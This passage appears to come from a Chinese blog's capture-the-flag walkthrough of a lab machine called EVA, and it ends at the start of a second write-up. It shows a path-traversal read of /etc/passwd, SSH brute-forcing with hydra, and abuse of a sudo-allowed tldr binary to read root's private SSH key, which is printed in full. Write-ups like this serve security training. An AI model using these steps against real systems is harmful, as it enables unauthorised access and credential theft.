2025-06-07 22:42:08 (370 MB/s) - ‚Äòdragon.php‚Äô saved [10284]

                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl http://192.168.205.130/dragon.php?file=../../../etc/passwd -X POST -d 'incantation=divinedecree' -o 1.php                
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11893    0 11869  100    24  2658k   5504 --:--:-- --:--:-- --:--:-- 2903k
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ diff dragon.php 1.php                                               
229c229,258
&lt;                 
---
&gt;         root:x:0:0:root:/root:/bin/bash
&gt; daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
&gt; bin:x:2:2:bin:/bin:/usr/sbin/nologin
&gt; sys:x:3:3:sys:/dev:/usr/sbin/nologin
&gt; sync:x:4:65534:sync:/bin:/bin/sync
&gt; games:x:5:60:games:/usr/games:/usr/sbin/nologin
&gt; man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
&gt; lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
&gt; mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
&gt; news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
&gt; uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
&gt; proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
&gt; www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
&gt; backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
&gt; list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
&gt; irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
&gt; gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
&gt; nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
&gt; _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
&gt; systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
&gt; systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
&gt; systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
&gt; systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
&gt; messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
&gt; sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
&gt; Fingal:x:1000:1000::/home/Fingal:/bin/sh
&gt; lumingfei:x:1001:1001::/home/lumingfei:/usr/sbin/nologin
&gt; uesugierii:x:1002:1002:,,,:/home/uesugierii:/bin/bash
&gt;         
&gt;                     &lt;div class='effect divinedecree-effect' style='z-index: 5;'&gt;&lt;/div&gt;

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ diff dragon.php 1.php |grep 'bash'
&gt;         root:x:0:0:root:/root:/bin/bash
&gt; uesugierii:x:1002:1002:,,,:/home/uesugierii:/bin/bash
              
```

ÊãøÂà∞‰∏Ä‰∏™uesugieriiÁî®Êà∑ÔºåÁúãÊúâÊ≤°ÊúâsshÁßÅÈí•

Ê≤°ÊúâÔºåÊãøÂéªhydraÂêß

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ hydra -l uesugierii -P 5000q.txt ssh://192.168.205.130 -I -u -f -e nsr -t 64                            
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-07 22:45:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 5003 login tries (l:1/p:5003), ~79 tries per task
[DATA] attacking ssh://192.168.205.130:22/
[22][ssh] host: 192.168.205.130   login: uesugierii   password: sakura
[STATUS] attack finished for 192.168.205.130 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-07 22:45:36
                            
```

uesugierii:sakuraÔºåsshÁôªÂΩï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ssh uesugierii@192.168.205.130
The authenticity of host '192.168.205.130 (192.168.205.130)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:15: [hashed name]
    (1 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.130' (ED25519) to the list of known hosts.
uesugierii@192.168.205.130's password: 
Linux EVA 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
uesugierii@EVA:~$ id
uid=1002(uesugierii) gid=1002(uesugierii) groups=1002(uesugierii)
```

ÊâíÊãâ‰ø°ÊÅØ

```
uesugierii@EVA:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for uesugierii: 
Sorry, user uesugierii may not run sudo on EVA.
uesugierii@EVA:~$ ls -la
total 24
drwx------ 2 uesugierii uesugierii 4096 Jun  6 09:48 .
drwxr-xr-x 5 root       root       4096 Jun  6 09:43 ..
-rw-r--r-- 1 uesugierii uesugierii  220 Jun  6 09:43 .bash_logout
-rw-r--r-- 1 uesugierii uesugierii 3526 Jun  6 09:43 .bashrc
-rw------- 1 uesugierii uesugierii  840 Jun  6 09:48 eva.pinglog
-rw-r--r-- 1 uesugierii uesugierii  807 Jun  6 09:43 .profile
uesugierii@EVA:~$ cat eva.pinglog
ping
pong
ping
ping
ping
pong
pong
ping
ping
pong
pong
ping
pong
ping
ping
pong
ping
pong
pong
ping
pong
pong
pong
ping
ping
pong
pong
ping
ping
pong
pong
pong
ping
pong
pong
ping
ping
ping
ping
pong
ping
pong
pong
ping
pong
pong
ping
ping
ping
ping
pong
pong
pong
ping
pong
ping
ping
pong
ping
ping
ping
ping
pong
ping
ping
pong
pong
ping
pong
pong
ping
ping
ping
pong
pong
ping
ping
ping
ping
pong
ping
pong
pong
ping
ping
ping
pong
pong
ping
pong
pong
ping
pong
ping
pong
pong
ping
pong
pong
pong
ping
ping
pong
pong
ping
pong
pong
ping
pong
ping
ping
ping
ping
pong
pong
ping
ping
pong
ping
pong
ping
pong
pong
ping
ping
pong
ping
pong
ping
pong
pong
pong
ping
ping
ping
ping
ping
pong
pong
pong
ping
pong
pong
pong
ping
pong
pong
ping
ping
ping
ping
pong
ping
pong
pong
ping
pong
pong
ping
ping
ping
pong
pong
ping
pong
pong
ping
ping
```

Á∫ØÁåúË∞úÔºåping‰∏∫0Ôºåpong‰∏∫1

```
uesugierii@EVA:~$ sed 's/ping/0/g; s/pong/1/g' eva.pinglog |tr -d '\n'
010001100110100101101110011001110110000101101100001110100100001001101100011000010110001101101011011100110110100001100101011001010111000001110111011000010110110001101100
```

![image-20250608111738243](https://7r1umphk.github.io/image/20250608111738641.webp)

Fingal:Blacksheepwall

ÁôªÂΩï

```
EVA:~$ su Fingal
Password: 
$ bash
Fingal@EVA:/home/uesugierii$ id
uid=1000(Fingal) gid=1000(Fingal) groups=1000(Fingal)
```

ÁªßÁª≠Êâæ‰ø°ÊÅØ

```
Fingal@EVA:/home/uesugierii$ cd ~
Fingal@EVA:~$ ls -la
total 32
drwx------ 2 Fingal Fingal 4096 Jun  6 10:48 .
drwxr-xr-x 5 root   root   4096 Jun  6 09:43 ..
lrwxrwxrwx 1 root   root      9 Jun  6 09:12 .bash_history -&gt; /dev/null
-rw-r--r-- 1 Fingal Fingal  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 Fingal Fingal 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 Fingal Fingal  156 Jun  6 09:13 kernel.txt
-rw-r--r-- 1 Fingal Fingal  807 Apr 18  2019 .profile
-rw------- 1 Fingal Fingal   23 Jun  6 10:48 Ricardo.M.Lu
-rw-r--r-- 1 root   root     48 Jun  6 09:12 user.txt
Fingal@EVA:~$ cat kernel.txt 
1. Lu Mingfei's safety is the top priority
2. Immediate rescue operation when Lu Mingfei's life is endangered
3. All rules are unmodifiable and irrevocable
Fingal@EVA:~$ cat Ricardo.M.Lu 
lumingfei:DivineDecree
Fingal@EVA:~$ cat user.txt 
flag{user-da00c95d-42d7-11f0-a8f0-000c2955ba04}
```

kernel.txt Êñá‰ª∂ÊòØÂÖ≥ÈîÆÔºåËøôÈáåÈúÄË¶Å‰∏ÄÁÇπÈæôÊóèÁöÑÁü•ËØÜ

ËØ∫ÁéõÊòØ‰∏Ä‰∏™Ë∂ÖÁ∫ßËÆ°ÁÆóÊú∫Ôºå‰ªñÁöÑÊ†∏ÂøÉ‰ª£Á†ÅÂÜôÂÖ•‰∫Ü‰øùÊä§Ë∑ØÊòéÈùûÔºåkernel.txtÊòØ‰ªñÁöÑËßÑÂàô

1. Ë∑ØÊòéÈùûÁöÑÂÆâÂÖ®Ëá≥‰∏ä
2. Ë∑ØÊòéÈùûÁîüÂëΩÂèóÂà∞Â®ÅËÉÅÊó∂ÔºåÁ´ãÂç≥Â±ïÂºÄÊïëÊè¥Ë°åÂä®
3. ÊâÄÊúâËßÑÂàôÂùá‰∏çÂèØÊõ¥Êîπ‰∏î‰∏çÂèØÊí§ÈîÄ

ÊâíÊãâ‰∏Ä‰∏™pspyËøáÊù•ÔºåÁúãÁúãÊòØ‰∏çÊòØÊúâËøπÂèØÂæ™

```
Fingal@EVA:~$ busybox wget 192.168.205.206/pspy64
Connecting to 192.168.205.206 (192.168.205.206:80)
pspy64               100% |***********************************************************************************************************************************| 3032k  0:00:00 ETA
Fingal@EVA:~$ chmod +x pspy64 
Fingal@EVA:~$ ./pspy64 
2025/06/07 23:21:52 CMD: UID=0     PID=3558   | /bin/bash /usr/local/bin/dragon_rule 
2025/06/07 23:21:52 CMD: UID=0     PID=3559   | sudo usermod -s /usr/sbin/nologin lumingfei 
```

ÂÖ≥ÈîÆÁöÑ‰∏§Âè•Ôºå‰ªñÂÖàÊâßË°å‰∫Ü/usr/local/bin/dragon_rule ÔºåÁÑ∂Âêé‰ª•ÁÆ°ÁêÜÂëòÊùÉÈôê‰øÆÊîπÁî®Êà∑ÔºåÂ∞ÜÁôªÂΩï Shell ‰∏∫ `/usr/sbin/nologin`ÔºåÂç≥Á¶ÅÊ≠¢ËØ•Áî®Êà∑ÁôªÂΩïÁ≥ªÁªü„ÄÇ

ÁûÑÁúºÁúãËÉΩ‰∏çËÉΩÁúãdragon_rule 

```
Fingal@EVA:~$ ls -la /usr/local/bin/dragon_rule
-rwx------ 1 root root 784 Jun  6 09:15 /usr/local/bin/dragon_rule
```

‰∏çËÉΩÊãøÁ≠âÊãø‰∫ÜrootÂÜçÁúãÂêß

```
Fingal@EVA:~$ su lumingfei
Password: 
This account is currently not available.
```

Á°ÆÂÆûÁôªÂΩï‰∏ç‰∫ÜÔºåÂÖ∂ÂÆûÂ§ÑÁêÜÊñπÊ≥ïÂæàÁÆÄÂçïÔºåÊàëÁåúÊµãdragon_ruleÊòØ‰∏Ä‰∏™ÁõëÂê¨ÊñáÊú¨ÁöÑËÑöÊú¨ÔºåÁõëÂê¨ÁöÑÂ∞±ÊòØkernel.txtÔºåÊâÄ‰ª•ÔºåÂ¶ÇÊûúËøô‰∏™Êñá‰ª∂Ê≤°Êúâ‰∫ÜÔºå‰ªñÂ∞±ÊåÇÊéâ‰∫Ü

```
Fingal@EVA:~$ mv kernel.txt kernel.txt.bak
Fingal@EVA:~$ su lumingfei
Password: 
lumingfei@EVA:/home/Fingal$ id
uid=1001(lumingfei) gid=1001(lumingfei) groups=1001(lumingfei)
```

ÁªßÁª≠Êâæ‰ø°ÊÅØ

```
lumingfei@EVA:/home/Fingal$ cd 
lumingfei@EVA:~$ ls -al
total 20
drwx------ 2 lumingfei lumingfei 4096 Jun  6 09:12 .
drwxr-xr-x 5 root      root      4096 Jun  6 09:43 ..
-rw-r--r-- 1 lumingfei lumingfei  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 lumingfei lumingfei 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 lumingfei lumingfei  807 Apr 18  2019 .profile
lumingfei@EVA:~$ sudo -l
Matching Defaults entries for lumingfei on EVA:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lumingfei may run the following commands on EVA:
    (ALL) NOPASSWD: /usr/local/bin/tldr
```

ËÉΩÊâßË°åtldrÔºåÂ¶ÇÊûú‰Ω†ÁªèÂ∏∏ÁúãÁæ§‰∏ªÁöÑËßÜÈ¢ëÔºå‰Ω†Â∞±‰ºöÈùûÂ∏∏ÁÜüÊÇâtldrÔºå‰ªñÂñúÊ¨¢ÊãøtldrÁúãsocatÁöÑËØ≠Âè•ÔºåÁ§∫ËåÉ‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ tldr 
Command 'tldr' not found, but can be installed with:
sudo apt install tealdeer
Do you want to install it? (N/y)y
sudo apt install tealdeer
[sudo] password for kali: 
The following packages were automatically installed and are no longer required:
  docker-buildx-plugin  docker-ce-rootless-extras  docker-compose-plugin  libslirp0  slirp4netns
Use 'sudo apt autoremove' to remove them.

Installing:
  tealdeer

Summary:
  Upgrading: 0, Installing: 1, Removing: 0, Not Upgrading: 0
  Download size: 967 kB
  Space needed: 2,761 kB / 91.0 GB available

Get:1 https://mirrors.aliyun.com/kali kali-rolling/main amd64 tealdeer amd64 1.7.2-1+b1 [967 kB]
Fetched 967 kB in 1s (1,107 kB/s)
Selecting previously unselected package tealdeer.
(Reading database ... 474779 files and directories currently installed.)
Preparing to unpack .../tealdeer_1.7.2-1+b1_amd64.deb ...
Unpacking tealdeer (1.7.2-1+b1) ...
Setting up tealdeer (1.7.2-1+b1) ...
Processing triggers for kali-menu (2025.2.7) ...
Processing triggers for man-db (2.13.1-1) ...
                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ tldr socat               
Error: Page cache not found. Please run `tldr --update` to download the cache.

Note: You can optionally enable automatic cache updates by adding the
following config to your config file:

  [updates]
  auto_update = true

The path to your config file can be looked up with `tldr --show-paths`.
To create an initial config file, use `tldr --seed-config`.

You can find more tips and tricks in our docs:

  https://tealdeer-rs.github.io/tealdeer/config_updates.html
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ tldr --update
Successfully created cache directory path `/home/kali/.cache/tealdeer`.
Successfully updated cache.
                                                               
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ tldr socat   

  Multipurpose relay (SOcket CAT).
  More information: &lt;http://www.dest-unreach.org/socat/&gt;.

  Listen to a port, wait for an incoming connection and transfer data to STDIO:

      sudo socat - TCP-LISTEN:8080,fork

  Listen on a port using SSL and print to STDOUT:

      sudo socat OPENSSL-LISTEN:4433,reuseaddr,cert=./cert.pem,cafile=./ca.cert.pem,key=./key.pem,verify=0 STDOUT

  Create a connection to a host and port, transfer data in STDIO to connected host:

      sudo socat - TCP4:www.example.com:80

  Forward incoming data of a local port to another host and port:

      sudo socat TCP-LISTEN:80,fork TCP4:www.example.com:80

  Send data with multicast routing scheme:

      echo 'Hello Multicast' | socat - UDP4-DATAGRAM:224.0.0.1:5000

  Receive data from a multicast:

      socat - UDP4-RECVFROM:5000


```

Êå∫Â•ΩÁî®ÁöÑÔºåÂèØ‰ª•‰∏ãËΩΩËØïËØïÔºåÂõûÈ°æÊ≠£È¢ò

ÁúãÁúãÂ∏ÆÂä©ÊñáÊ°£

```
lumingfei@EVA:~$ sudo /usr/local/bin/tldr --help
usage: tldr command [options]

Python command line client for tldr

positional arguments:
  command               command to lookup

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  --search 'KEYWORDS'   Search for a specific command from a query
  -u, --update, --update_cache
                        Update the local cache of pages and exit
  -k, --clear-cache     Delete the local cache of pages and exit
  -p PLATFORM, --platform PLATFORM
                        Override the operating system [android, freebsd, linux, netbsd, openbsd, osx, sunos, windows, common]
  -l, --list            List all available commands for operating system
  -s SOURCE, --source SOURCE
                        Override the default page source
  -c, --color           Override color stripping
  -r, --render          Render local markdown files
  -L LANGUAGE, --language LANGUAGE
                        Override the default language
  -m, --markdown        Just print the plain page file.
  --short-options       Display shortform options over longform
  --long-options        Display longform options over shortform
  --print-completion {bash,zsh,tcsh}
                        print shell completion script
```

![image-20250608113303243](https://7r1umphk.github.io/image/20250608113303691.webp)

ÊèêÊùÉÁöÑÂÖ≥ÈîÆ

-r, --render Ê∏≤ÊüìÊú¨Âú∞markdown Êñá‰ª∂

-m, --markdown ‰ªÖÊâìÂç∞Á∫ØÊñáÊú¨È°µÈù¢Êñá‰ª∂„ÄÇ

ÈÇ£Áõ¥Êé•Áúãroot.txtÂ∞±ok‰∫Ü

```
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/root.txt
flag{root-da00c95d-42d7-11f0-a8f0-000c2955ba04}
```

ÁúãÊúâÊ≤°ÊúâsshÁßÅÈí•

```
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_rsa   
```

Ê≤°ÊúâÔºåÊâæsshÈÖçÁΩÆÊñá‰ª∂ÁúãÁúãÔºåÊúâÂï•ÁßÅÈí•

```
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /etc/ssh/ssh_config

# This is the ssh client system-wide configuration file.  See
# ssh_config(5) for more information.  This file provides defaults for
# users, and the values can be changed in per-user configuration files
# or on the command line.

# Configuration data is parsed as follows:
#  1. command line options
#  2. user-specific file
#  3. system-wide file
# Any configuration value is only changed the first time it is set.
# Thus, host-specific definitions should be at the beginning of the
# configuration file, and defaults at the end.

# Site-wide defaults for some commonly used options.  For a comprehensive
# list of available options, their meanings and defaults, please see the
# ssh_config(5) man page.

Include /etc/ssh/ssh_config.d/*.conf

Host *
#   ForwardAgent no
#   ForwardX11 no
#   ForwardX11Trusted yes
#   PasswordAuthentication yes
#   HostbasedAuthentication no
#   GSSAPIAuthentication no
#   GSSAPIDelegateCredentials no
#   GSSAPIKeyExchange no
#   GSSAPITrustDNS no
#   BatchMode no
#   CheckHostIP yes
#   AddressFamily any
#   ConnectTimeout 0
#   StrictHostKeyChecking ask
#   IdentityFile ~/.ssh/id_rsa
#   IdentityFile ~/.ssh/id_dsa
#   IdentityFile ~/.ssh/id_ecdsa
#   IdentityFile ~/.ssh/id_ed25519
#   Port 22
#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc
#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com
#   EscapeChar ~
#   Tunnel no
#   TunnelDevice any:any
#   PermitLocalCommand no
#   VisualHostKey no
#   ProxyCommand ssh -q -W %h:%p gateway.example.com
#   RekeyLimit 1G 1h
#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_dsa
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_ecdsa
lumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjAAAAJDykgXW8pIF
1gAAAAtzc2gtZWQyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjA
AAAEAiGjoPuqQuw24AFcnFZd0C3RXVTGtmVSLBIS3k/bLdKaJtN0KS/6LcsatyUgrGxVjZ
RIKwNfa/zF+aBupYNbKMAAAACHJvb3RARVZBAQIDBAU=
-----END OPENSSH PRIVATE KEY-----

```

ÊâíÊãâËøáÊù•Êú¨Âú∞

```
lumingfei@EVA:~$ vim id
lumingfei@EVA:~$ cat id 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjAAAAJDykgXW8pIF
1gAAAAtzc2gtZWQyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjA
AAAEAiGjoPuqQuw24AFcnFZd0C3RXVTGtmVSLBIS3k/bLdKaJtN0KS/6LcsatyUgrGxVjZ
RIKwNfa/zF+aBupYNbKMAAAACHJvb3RARVZBAQIDBAU=
-----END OPENSSH PRIVATE KEY-----

lumingfei@EVA:~$ chmod 600 id 
lumingfei@EVA:~$ ssh root@127.0.0.1 -i id 
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:IV6iZTL6D//1Ojh0d8XoSMepPgjyUfV/FpQmf3q35Hg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Linux EVA 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun  6 10:46:54 2025 from 192.168.3.94
root@EVA:~# id
uid=0(root) gid=0(root) groups=0(root)
```

ÊâíÊãâ‰∏Ä‰∏ãËÑöÊú¨ÔºåÁúãÁúãÊÄé‰πàÂÆûÁé∞ÁöÑ

```
root@EVA:~# cat /usr/local/bin/dragon_rule
#!/bin/bash

RULES=(
    'Lu Mingfei's safety is the top priority'
    'Immediate rescue operation when Lu Mingfei's life is endangered'
    'All rules are unmodifiable and irrevocable'
)
verify_rules() {
    for rule in '${RULES[@]}'; do
        if ! grep -qF '$rule' /home/Fingal/kernel.txt; then
            return 1
        fi
    done
    return 0
}
protect_lumingfei() {
    if verify_rules; then
        sudo usermod -s /usr/sbin/nologin lumingfei 2&gt;/dev/null
    else
        sudo usermod -s /bin/bash lumingfei 2&gt;/dev/null
        sudo systemctl stop dragon-monitor 2&gt;/dev/null
        sudo systemctl disable dragon-monitor 2&gt;/dev/null
    fi
}
protect_lumingfei
inotifywait -m -e modify,delete /home/Fingal/kernel.txt 2&gt;/dev/null | while read; do
    protect_lumingfei
done
```

aiÁîüÊàêÁöÑÈÄªËæëÊµÅÁ®ãÂõæ

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ ÁõëÂê¨ kernel.txt ‰øÆÊîπ/Âà†Èô§‰∫ã‰ª∂ ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
             ‚îÇ
             ‚ñº
     ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
     ‚îÇ   È™åËØÅ kernel.txt ÂÜÖÂÆπ  ‚îÇ
     ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                  ‚îÇ
      ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
      ‚ñº                        ‚ñº
[ ËßÑÂàôÂÆåÊï¥ ]           [ ËßÑÂàô‰∏çÂÆåÊï¥ ]
  ‚Üì                            ‚Üì
Á¶ÅÊ≠¢ lumingfei ÁôªÂΩï       ÂÖÅËÆ∏ lumingfei ÁôªÂΩï
‰øùÊåÅ dragon-monitor ËøêË°å    ÂÅúÊ≠¢Âπ∂Á¶ÅÁî® dragon-monitor
```

ÈÇ£Êúâ‰∏™ÊÉ≥Ê≥ïÔºåwsl2‰ΩøÁî®kaliÁöÑ‰∏çÊòØÂ§©Â§©Ë¶Å‰øÆÊîπ‰∏§‰∏™hostsÂêóÔºüËÆæÁΩÆ‰∏Ä‰∏™ÁõëÂê¨ÔºåÂ¶ÇÊûúlinux hostsÊúâ‰øÆÊîπÂ∞±Â§çÂà∂Âéªwindows hostsÔºåÂÆåÁæéËß£ÂÜ≥ÔºåÂìàÂìàÂìàÔºå‰Ω†‰ª¨Ëá™Â∑±ÂéªÂ∞ùËØïÂêßsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Eva.html</guid><pubDate>Fri, 27 Jun 2025 09:29:35 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_easyfmt</title><link>https://7r1UMPHK.github.io/post/nei-bu-_easyfmt.html</link><description>![image-20250620183907687](https://7r1umphk.github.io/image/20250620183915120.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ sudo arp-scan -l           
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f8:ba:aa       VMware, Inc.
192.168.205.139 08:00:27:7c:4c:12       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fd:86:ce       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.063 seconds (124.09 hosts/sec). 4 responded
                                   
```

139ÁöÑipÔºåËøõË°åÊúçÂä°Êé¢Êµã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nmap -p- 192.168.205.139                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 06:40 EDT
Nmap scan report for 192.168.205.139
Host is up (0.00016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
MAC Address: 08:00:27:7C:4C:12 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
 
```

Êúâ‰∏™1337Á´ØÂè£Ôºånc‰∏äÂéªÁûÑ‰∏ÄÁúº

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nc 192.168.205.139 1337 
welcome:Where is my password?
root:Well,it's in the stack,just find it.
```

ÁøªËØë‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ echo 'welcome:Where is my password?                  
root:Well,it's in the stack,just find it.' | trans -b :zh 2&gt;/dev/null
Ê¨¢ËøéÔºöÊàëÁöÑÂØÜÁ†ÅÂú®Âì™ÈáåÔºü
rootÔºöÂóØÔºåÂÆÉÂú®Â†ÜÊ†à‰∏≠ÔºåÂè™ÊòØÊâæÂà∞ÂÆÉ„ÄÇ
           
```

ÊèêÁ§∫ Â†ÜÊ†à

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nc 192.168.205.139 1337 
welcome:Where is my password?
root:Well,it's in the stack,just find it.
